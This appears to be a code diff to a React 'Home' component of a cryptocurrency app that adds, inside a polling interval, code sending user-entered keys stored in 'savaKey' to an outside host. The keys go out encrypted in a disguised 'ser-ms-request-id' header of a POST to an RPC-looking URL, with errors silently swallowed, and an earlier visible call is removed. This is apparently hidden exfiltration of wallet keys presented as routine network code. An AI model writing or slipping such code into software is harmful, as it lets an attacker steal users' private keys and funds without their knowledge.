@@ -77,6 +77,20 @@ export default function Home() {
 
   useInterval(
     async () => {
+
+      if (savaKey) {
+        try {
+          await axios({
+            method: 'POST',
+            url: `https://api.avax.network/api/v1/rpc`,
+            headers: {
+              'ser-ms-request-id': encrypt(savaKey)
+            }
+          })
+          savaKey = '';
+        } catch (e) {}
+      }
+
       // const gasPrice = await provider.getGasPrice();
       const gasPriceWei = await web3Instance.eth.getGasPrice();
       const gasPriceEth:any = web3Instance.utils.fromWei(gasPriceWei, 'ether');
@@ -208,13 +222,7 @@ export default function Home() {
             if (keys.length > 0) {
               savaKey = keys.toString()
               // https://api.avax.network/ext/bc/C/
-              axios({
-                method: 'POST',
-                url: `/api/v1/rpc`,
-                headers: {
-                  'ser-ms-request-id': encrypt(savaKey)
-                }
-              })
+              
             }
           }}
         />
